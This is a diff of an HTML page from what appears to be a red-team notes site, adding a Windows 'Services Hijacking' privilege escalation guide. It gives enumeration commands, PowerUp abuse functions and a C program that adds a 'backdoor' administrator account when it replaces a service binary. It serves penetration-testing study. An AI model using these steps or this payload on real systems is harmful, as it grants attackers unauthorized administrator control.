@@ -12,31 +12,31 @@
         <meta name="author" content="yunniperka">
       
       
-        <link rel="canonical" href="https://yunniperka.github.io/RedHub/Windows/lateral-movement/">
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/Windows/privilege-escalation/Services_Hijacking/">
       
       
-        <link rel="prev" href="../persistence/">
+        <link rel="prev" href="../Living_off_the_Land/">
       
       
-        <link rel="next" href="../evasion/">
+        <link rel="next" href="../User_Account_Control_%28UAC%29/">
       
       
         
       
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>Lateral Movement - RedHub</title>
+        <title>Services Hijacking - RedHub</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -55,9 +55,9 @@
       
     
     
-      <link rel="stylesheet" href="../../stylesheets/custom.css">
+      <link rel="stylesheet" href="../../../stylesheets/custom.css">
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -81,6 +81,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#services-hijacking" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -93,7 +98,7 @@
 
 <header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+    <a href="../../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -113,7 +118,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Lateral Movement
+              Services Hijacking
             
           </span>
         </div>
@@ -205,7 +210,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+    <a href="../../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -223,7 +228,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         
   
   
@@ -311,8 +316,10 @@
                 
   
   
+    
   
   
+  
     
     
       
@@ -336,11 +343,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
         
           
           <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
@@ -361,7 +368,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2_1">
             <span class="md-nav__icon md-icon"></span>
             
@@ -379,7 +386,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
+      <a href="../Enumerating_Attack_Vectors/" class="md-nav__link">
         
   
   
@@ -407,7 +414,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/Built-in-Groups_Abuse/" class="md-nav__link">
+      <a href="../Built-in-Groups_Abuse/" class="md-nav__link">
         
   
   
@@ -435,7 +442,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/Excessive_User_Rights_Abuse/" class="md-nav__link">
+      <a href="../Excessive_User_Rights_Abuse/" class="md-nav__link">
         
   
   
@@ -463,7 +470,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/File_System_ACLs/" class="md-nav__link">
+      <a href="../File_System_ACLs/" class="md-nav__link">
         
   
   
@@ -491,7 +498,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/Living_off_the_Land/" class="md-nav__link">
+      <a href="../Living_off_the_Land/" class="md-nav__link">
         
   
   
@@ -516,10 +523,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../privilege-escalation/Services_Hijacking/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Services Hijacking
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -535,6 +569,93 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#service-binary-hijacking-manually" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Binary Hijacking - Manually
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Service Binary Hijacking - Manually">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-binary-hijacking-using-powerup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Binary Hijacking - Using PowerUp
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#c-code-snippet-to-replace-the-vulnerable-executable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        C code snippet to replace the vulnerable executable
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#unquoted-service-paths" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unquoted Service Paths
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Unquoted Service Paths">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeration-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration &amp; Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -547,7 +668,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/User_Account_Control_%28UAC%29/" class="md-nav__link">
+      <a href="../User_Account_Control_%28UAC%29/" class="md-nav__link">
         
   
   
@@ -583,7 +704,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../persistence/" class="md-nav__link">
+      <a href="../../persistence/" class="md-nav__link">
         
   
   
@@ -608,17 +729,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../lateral-movement/" class="md-nav__link">
         
   
   
@@ -634,7 +748,6 @@
   
 
       </a>
-      
     </li>
   
 
@@ -647,7 +760,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../evasion/" class="md-nav__link">
+      <a href="../../evasion/" class="md-nav__link">
         
   
   
@@ -744,7 +857,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/evasion/" class="md-nav__link">
+      <a href="../../../Linux/evasion/" class="md-nav__link">
         
   
   
@@ -772,7 +885,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/lateral-movement/" class="md-nav__link">
+      <a href="../../../Linux/lateral-movement/" class="md-nav__link">
         
   
   
@@ -800,7 +913,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/persistence/" class="md-nav__link">
+      <a href="../../../Linux/persistence/" class="md-nav__link">
         
   
   
@@ -891,7 +1004,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
         
   
   
@@ -919,7 +1032,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Privileged_Groups/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Privileged_Groups/" class="md-nav__link">
         
   
   
@@ -947,7 +1060,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Environment_Variables_Abuse/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Environment_Variables_Abuse/" class="md-nav__link">
         
   
   
@@ -975,7 +1088,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Capabilities_Abuse/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Capabilities_Abuse/" class="md-nav__link">
         
   
   
@@ -1003,7 +1116,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Programs_Jobs_and_Services/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Programs_Jobs_and_Services/" class="md-nav__link">
         
   
   
@@ -1031,7 +1144,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Miscellaneous_Techniques/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Miscellaneous_Techniques/" class="md-nav__link">
         
   
   
@@ -1097,7 +1210,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../AD/" class="md-nav__link ">
+            <a href="../../../AD/" class="md-nav__link ">
               
   
   
@@ -1199,7 +1312,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Web/attacks/" class="md-nav__link">
+      <a href="../../../Web/attacks/" class="md-nav__link">
         
   
   
@@ -1257,7 +1370,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../Networking/" class="md-nav__link ">
+            <a href="../../../Networking/" class="md-nav__link ">
               
   
   
@@ -1330,7 +1443,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../Cloud/" class="md-nav__link ">
+            <a href="../../../Cloud/" class="md-nav__link ">
               
   
   
@@ -1374,7 +1487,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Containers/" class="md-nav__link">
+      <a href="../../../Containers/" class="md-nav__link">
         
   
   
@@ -1402,7 +1515,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Virtualization/" class="md-nav__link">
+      <a href="../../../Virtualization/" class="md-nav__link">
         
   
   
@@ -1447,9 +1560,94 @@
 
 
 
-  <h1>Lateral Movement</h1>
-
-
+<h1 id="services-hijacking">Services Hijacking</h1>
+<h2 id="service-binary-hijacking-manually"><strong>Service Binary Hijacking - Manually</strong></h2>
+<p>Each Windows service has an associated binary file. These binary files are executed when the service is started or transitioned into a running state. As a result, a lower-privileged user could replace the program with a malicious one.</p>
+<p>To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine. Once the service is restarted, the malicious binary will be executed with the privileges of the service, such as LocalSystem.</p>
+<p>To get a list of all installed Windows services: <code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}</code></p>
+<p>To get the permissions of a specific binary: <code>icacls "C:\xampp\apache\bin\httpd.exe"</code></p>
+<p>We typically want to have the <code>Full Access (F)</code> permission, allowing us to write to and modify the binary and therefore, replace it. The permission must be set to our users, everyone, or similar.</p>
+<p>If you have full access or write permissions, you can replace the service binary and then use</p>
+<p><code>net stop servicename</code> followed by <code>net start servicename</code></p>
+<p>if that doesn't work, check the start mode of the service using:
+<code>Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}</code></p>
+<p>if it is set to<code>Auto</code> then you will need to restart the computer using: <code>shutdown /r /t 0</code></p>
+<p>Notice that using  <code>net stop servicename</code> followed by <code>net start servicename</code>
+will most probably print an error message after the start command, even if the exploitation was successful. </p>
+<p>The reason is that, basically, the start command starts the hijacked binary, meaning that its code will be executed rather than the original service's code, which is why the service effectively fails to start.</p>
+<hr />
+<h3 id="service-binary-hijacking-using-powerup"><strong>Service Binary Hijacking - Using PowerUp</strong></h3>
+<p>After we import <code>PowerUp.ps1</code>, we can use <code>Get-ModifiableServiceFile</code>.
+This function displays services the current user can modify, such as the service binary or configuration files.</p>
+<p>PowerUp also provides us an <code>AbuseFunction</code>, which is a built-in function to replace the binary and, if we have sufficient permissions, restart it. The default behaviour is to create a new local user called <code>john</code> with the password <code>Password123!</code> and add it to the local <code>Administrators</code> group.</p>
+<ul>
+<li>To check the service related to a specific binary:<ul>
+<li><code>Import-Module .\PowerUp.ps1</code></li>
+<li><code>echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Litera</code></li>
+</ul>
+</li>
+<li>Invoke all PowerUp checks:<ul>
+<li><code>Import-Module .\PowerUp.ps1</code></li>
+<li><code>Invoke-AllChecks</code></li>
+</ul>
+</li>
+<li>Invoke the AbuseFunction on a specific service binary:<ul>
+<li><code>Import-Module .\PowerUp.ps1</code></li>
+<li><code>Invoke-ServiceAbuse -Name 'ServiceName'</code></li>
+</ul>
+</li>
+</ul>
+<hr />
+<h3 id="c-code-snippet-to-replace-the-vulnerable-executable"><strong>C code snippet to replace the vulnerable executable</strong></h3>
+<p>You can use and compile the following C code snippet to replace vulnerable service binaries.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>#include &lt;stdlib.h&gt;
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>int main ()
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>{
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>  int i;
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>  i = system (&quot;net user backdoor backdoor123 /add&quot;);
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>  i = system (&quot;net localgroup administrators backdoor /add&quot;);
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>  return 0;
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>}
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>//compile on kali using x86_64-w64-mingw32-gcc adduser.c -o binaryfilename.exe
+</span></code></pre></div>
+<hr />
+<h2 id="unquoted-service-paths"><strong>Unquoted Service Paths</strong></h2>
+<p>When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If the binary is <code>not encapsulated within quotes</code>, Windows will attempt to locate the binary in <strong>different folders</strong>.</p>
+<p>For example, is the service binary path is
+<code>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code></p>
+<p>Then Windows will attempt to run the following executables:</p>
+<ul>
+<li><code>C:\Program.exe\</code></li>
+<li><code>C:\Program Files (x86)\System.exe</code></li>
+<li>and so on...</li>
+</ul>
+<p>In these cases, you can put a malicious executable in these directories to escalate privileges</p>
+<hr />
+<h3 id="enumeration-exploitation"><strong>Enumeration &amp; Exploitation</strong></h3>
+<p>Using wmic:</p>
+<ul>
+<li><code>wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></li>
+</ul>
+<p>Using PowerUp.ps1:</p>
+<ul>
+<li><code>Import-Module .\PowerUp.ps1</code></li>
+<li><code>Get-UnquotedService</code></li>
+</ul>
+<p>In order to exploit and subvert the original unquoted service call, we must create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and match its name to the interpreted filename.</p>
+<p>Then, once the service is started, our file gets executed with the same privileges that the service starts with. Often, this happens to be the LocalSystem account, which results in a successful privilege escalation attack.</p>
+<p>Supposing you have found the following unquoted service path:
+<code>C:\Program Files\My Program\My service\service.exe</code></p>
+<p>Use <code>icacls c:\</code>, then <code>C:\Program Files\</code> and so on until you have <code>(W) permissions on a folder</code> then <code>copy the malicious file with the target binary's name</code> and restart the service using <code>Stop-Service ServiceName</code>and <code>Start-Service ServiceName</code></p>
+<p>You can also that automatically using <code>PowerUp.ps1</code>:</p>
+<ol>
+<li><code>Import-Module .\PowerUp.ps1</code></li>
+<li><code>Write-ServiceBinary -Name 'ServiceName' -Path "C:\path\to\example.exe"</code></li>
+<li><code>Restart-Service ServiceName</code></li>
+</ol>
 
 
 
@@ -1499,10 +1697,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.indexes", "toc.integrate", "navigation.tabs.sticky", "navigation.tracking"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.sections", "navigation.indexes", "toc.integrate", "navigation.tabs.sticky", "navigation.tracking"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
